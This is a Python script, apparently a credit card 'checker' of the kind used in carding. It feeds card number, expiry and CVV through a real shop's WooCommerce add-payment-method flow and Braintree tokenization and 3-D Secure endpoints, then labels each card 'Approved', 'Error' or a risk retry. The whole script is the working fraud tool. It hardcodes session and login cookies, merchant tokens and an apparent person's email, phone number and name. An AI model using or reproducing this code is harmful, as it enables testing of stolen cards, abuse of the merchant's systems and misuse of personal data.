def capture(string, start, end):
    start_pos, end_pos = string.find(start), string.find(
        end, string.find(start) + len(start)
    )
    return (
        string[start_pos + len(start) : end_pos]
        if start_pos != -1 and end_pos != -1
        else None
    )

def Tele(ccx):
	
	import requests, re, base64, random, string, user_agent, time
	from requests_toolbelt.multipart.encoder 		import MultipartEncoder
	
	
	ccx = ccx.strip()
	parts = re.split('[|/:]', ccx)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]

	if "20" in yy:
		yy = yy.split("20")[1]
	
	
	r = requests.session()
	
	user = user_agent.generate_user_agent()

	cookies = {
    'mailchimp_landing_site': 'https%3A%2F%2Fwww.rossanoferretti.com%2Frw%2Frw%2Fmy-account%2Fadd-payment-method%2F',
    '_vwo_uuid_v2': 'D47BD6FA3C4240D3BC082759F65E88E4A|850b410a46ede3555dd8f711c7f0e6fe',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-06-22%2015%3A07%3A41%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.rossanoferretti.com%2Frw%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-06-22%2015%3A07%3A41%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.rossanoferretti.com%2Frw%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'data-timeout': 'false||false',
    '_gcl_au': '1.1.119124793.1719068862',
    '_ga': 'GA1.1.186869105.1719068863',
    '_clck': '1bzk810%7C2%7Cfmu%7C0%7C1634',
    '_fbp': 'fb.1.1719068863887.64631563425330570',
    'country_redirect': 'true',
    '_hjSession_3568193': 'eyJpZCI6IjE2YTA5NTJlLTgxMWItNDJjMC1hZTk5LTc5YTM1NWIwZDA2YiIsImMiOjE3MTkwNjg4NjQ0NzAsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=',
    'mailchimp.cart.current_email': 'negm2898@gmail.com',
    'mailchimp_user_email': 'negm2898%40gmail.com',
    'modal_dismissed': '1',
    '_hjSessionUser_3568193': 'eyJpZCI6IjQyNmM2Mzc0LWUxMGYtNWI3MS04NzRiLWViZGY2NGM2MWFhMyIsImNyZWF0ZWQiOjE3MTkwNjg4NjQ0NjQsImV4aXN0aW5nIjp0cnVlfQ==',
    'mailchimp.cart.previous_email': 'negm2898@gmail.com',
    'wordpress_sec_3347843f7c91a46d5cf935aab282ae83': 'negm2898%7C1720278431%7CXSKOo1kREpQqgMxAGNOFA4YvsN5FZEYwbcftya8TfeO%7Cb4750d81bf94ee61f7602a5eee676a2d32bb232c36c4dd07d92d2b7e6c7cf716',
    'wordpress_logged_in_3347843f7c91a46d5cf935aab282ae83': 'negm2898%7C1720278431%7CXSKOo1kREpQqgMxAGNOFA4YvsN5FZEYwbcftya8TfeO%7C2a11ea38a5f7e71974759295167d8f1fbd0fffc244c8dd5f8d1d3c0539590d97',
    'sbjs_session': 'pgs%3D20%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.rossanoferretti.com%2Frw%2Fmy-account%2Fadd-payment-method%2F',
    '_uetsid': '2ccc656030a911ef85e36b7011a3cdc3',
    '_uetvid': '2ccd240030a911efb85c55bdb206350c',
    '_ga_T9Q7G4SDBR': 'GS1.1.1719068862.1.1.1719069104.39.0.0',
    '_clsk': 'bsyb6e%7C1719069105088%7C10%7C1%7Cw.clarity.ms%2Fcollect',
}

	headers = {
    'authority': 'www.rossanoferretti.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
    'cache-control': 'max-age=0',
    'referer': 'https://www.rossanoferretti.com/rw/my-account/payment-methods/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	res1 = requests.get('https://www.rossanoferretti.com/rw/my-account/add-payment-method/', cookies=cookies, headers=headers)
	r4 = res1.text
	anonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', r4).group(1)
	T = capture(r4,'wc_braintree_client_token = ["','"]')
	encoded_text = T
	decoded_text = base64.b64decode(encoded_text).decode('utf-8')
	au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]

	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': 'Bearer {au}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'dff0493b-080d-4aee-9152-44b69133a432',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
                'billingAddress': {
                    'postalCode': '10080',
                    'streetAddress': '735 New Madinat Zayed Road',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
	}

	res2 = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

	token = res2.json()['data']['tokenizeCreditCard']['token']
    
	headers = {
    'authority': 'api.braintreegateway.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
    'content-type': 'application/json',
    'origin': 'https://www.rossanoferretti.com',
    'referer': 'https://www.rossanoferretti.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'amount': '0.00',
    'browserColorDepth': 24,
    'browserJavaEnabled': False,
    'browserJavascriptEnabled': True,
    'browserLanguage': 'en-US',
    'browserScreenHeight': 873,
    'browserScreenWidth': 393,
    'browserTimeZone': -180,
    'deviceChannel': 'Browser',
    'additionalInfo': {
        'billingLine1': '135 New Airport Road',
        'billingLine2': 'Al Danah',
        'billingCity': 'Abu Dhabi',
        'billingState': '',
        'billingPostalCode': '',
        'billingCountryCode': 'AE',
        'billingPhoneNumber': '01201094509',
        'billingGivenName': 'mohamed',
        'billingSurname': 'kozkomo',
        'email': 'negm2898@gmail.com',
    },
    'challengeRequested': True,
    'bin': '522274',
    'dfReferenceId': '0_8e53ea69-47c5-4482-9c46-600d1f08c43a',
    'clientMetadata': {
        'requestedThreeDSecureVersion': '2',
        'sdkVersion': 'web/3.102.0',
        'cardinalDeviceDataCollectionTimeElapsed': 83,
        'issuerDeviceDataCollectionTimeElapsed': 264,
        'issuerDeviceDataCollectionResult': True,
    },
    'authorizationFingerprint': au,
    'braintreeLibraryVersion': 'braintree/web/3.102.0',
    '_meta': {
        'merchantAppId': 'www.rossanoferretti.com',
        'platform': 'web',
        'sdkVersion': '3.102.0',
        'source': 'client',
        'integration': 'custom',
        'integrationType': 'custom',
        'sessionId': '75bce4f8-3d39-4e4b-88ec-77e688cc9af4',
    },
}

	res3 = requests.post(
    f'https://api.braintreegateway.com/merchants/n636kb5n4gj8rmq8/client_api/v1/payment_methods/{token}/three_d_secure/lookup',
    headers=headers,
    json=json_data,
)





	nonce = res3.json()['paymentMethod']['nonce']
    
    




    


	cookies = {
    'mailchimp_landing_site': 'https%3A%2F%2Fwww.rossanoferretti.com%2Frw%2Frw%2Fmy-account%2Fadd-payment-method%2F',
    '_vwo_uuid_v2': 'D47BD6FA3C4240D3BC082759F65E88E4A|850b410a46ede3555dd8f711c7f0e6fe',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-06-22%2015%3A07%3A41%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.rossanoferretti.com%2Frw%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-06-22%2015%3A07%3A41%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.rossanoferretti.com%2Frw%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'data-timeout': 'false||false',
    '_gcl_au': '1.1.119124793.1719068862',
    '_ga': 'GA1.1.186869105.1719068863',
    '_clck': '1bzk810%7C2%7Cfmu%7C0%7C1634',
    '_fbp': 'fb.1.1719068863887.64631563425330570',
    'country_redirect': 'true',
    '_hjSession_3568193': 'eyJpZCI6IjE2YTA5NTJlLTgxMWItNDJjMC1hZTk5LTc5YTM1NWIwZDA2YiIsImMiOjE3MTkwNjg4NjQ0NzAsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=',
    'mailchimp.cart.current_email': 'negm2898@gmail.com',
    'mailchimp_user_email': 'negm2898%40gmail.com',
    'modal_dismissed': '1',
    '_hjSessionUser_3568193': 'eyJpZCI6IjQyNmM2Mzc0LWUxMGYtNWI3MS04NzRiLWViZGY2NGM2MWFhMyIsImNyZWF0ZWQiOjE3MTkwNjg4NjQ0NjQsImV4aXN0aW5nIjp0cnVlfQ==',
    'mailchimp.cart.previous_email': 'negm2898@gmail.com',
    'wordpress_sec_3347843f7c91a46d5cf935aab282ae83': 'negm2898%7C1720278431%7CXSKOo1kREpQqgMxAGNOFA4YvsN5FZEYwbcftya8TfeO%7Cb4750d81bf94ee61f7602a5eee676a2d32bb232c36c4dd07d92d2b7e6c7cf716',
    'wordpress_logged_in_3347843f7c91a46d5cf935aab282ae83': 'negm2898%7C1720278431%7CXSKOo1kREpQqgMxAGNOFA4YvsN5FZEYwbcftya8TfeO%7C2a11ea38a5f7e71974759295167d8f1fbd0fffc244c8dd5f8d1d3c0539590d97',
    'wfwaf-authcookie-25fd32b62d30b7200d0835762df11d7f': '31244%7Cother%7C%7C4f1973269cf5e61dd3e77c55a19f2ecc70971f07f174649c3ed7d319388c741e',
    'sbjs_session': 'pgs%3D24%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.rossanoferretti.com%2Frw%2Fmy-account%2Fadd-payment-method%2F',
    '_uetsid': '2ccc656030a911ef85e36b7011a3cdc3',
    '_uetvid': '2ccd240030a911efb85c55bdb206350c',
    '_clsk': 'bsyb6e%7C1719069303032%7C12%7C1%7Cw.clarity.ms%2Fcollect',
    '_ga_T9Q7G4SDBR': 'GS1.1.1719068862.1.1.1719069308.40.0.0',
}

	headers = {
    'authority': 'www.rossanoferretti.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://www.rossanoferretti.com',
    'referer': 'https://www.rossanoferretti.com/rw/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = {
    f'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': nonce,
    'braintree_cc_device_data': '{"device_session_id":"13f364c1b24c63e32d72bc1a1ef92294","fraud_merchant_id":null,"correlation_id":"b6b9552aceee1890ba929121991ce733"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/n636kb5n4gj8rmq8/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/n636kb5n4gj8rmq8"},"merchantId":"n636kb5n4gj8rmq8","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"IE","currencyCode":"EUR","merchantIdentifier":"n636kb5n4gj8rmq8","supportedNetworks":["visa","mastercard","amex"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["American Express","Discover","Maestro","UK Maestro","MasterCard","Visa"]},"threeDSecureEnabled":true,"threeDSecure":{"cardinalAuthenticationJWT":"eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI2MWI4NDhlYi02MTAyLTQ4ZjQtYThhYy1iZWQ1YTI4ZmU3ZTUiLCJpYXQiOjE3MTkwNjg4MzYsImV4cCI6MTcxOTA3NjAzNiwiaXNzIjoiNWM4YTk5ZjA3OTFlZWYzMWU4MzE1MWQzIiwiT3JnVW5pdElkIjoiNWM4YTk5ZjA3OTFlZWYzMWU4MzE1MWQwIn0.NqcFjaB_bfoiNvSS5TyxHYtleX7klvgf_7u_FSDX70g"},"androidPay":{"displayName":"Rossano Ferretti","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTkxNTUyMzYsImp0aSI6IjQ5YzU4Y2JjLTFiNGQtNDE0ZS1hN2U0LTQ3ZGVmOGYzOTQxMiIsInN1YiI6Im42MzZrYjVuNGdqOHJtcTgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im42MzZrYjVuNGdqOHJtcTgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.VZxtcEg9zJoBPEPg2sSUSJZTvG4EQbLWE63mj3zOVOjEXlQk4HlHMaWqfiiT2r8ld_xpAD4RVL9xYPMt1KBkFg","paypalClientId":"ARPPamSFd5UGucKK5c1gsZIjTby-ExmKS7AcdOEdJ160q1Tav5ANjkCysqog5x99btiXOKSf44UZuxjF","supportedNetworks":["visa","mastercard","amex"]},"paypalEnabled":true,"paypal":{"displayName":"Rossano Ferretti","clientId":"ARPPamSFd5UGucKK5c1gsZIjTby-ExmKS7AcdOEdJ160q1Tav5ANjkCysqog5x99btiXOKSf44UZuxjF","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"rossanoferrettiEUR","payeeEmail":null,"currencyIsoCode":"EUR"}}',
    'woocommerce-add-payment-method-nonce': anonce,
    '_wp_http_referer': '/rw/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

	response = requests.post(
    'https://www.rossanoferretti.com/rw/my-account/add-payment-method/',
    cookies=cookies,
    headers=headers,
    data=data,
)

	pattern = r'Reason: (.*?)\s*</li>'
    
	text = response.text
	
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
			
			
			
	return result
	
	

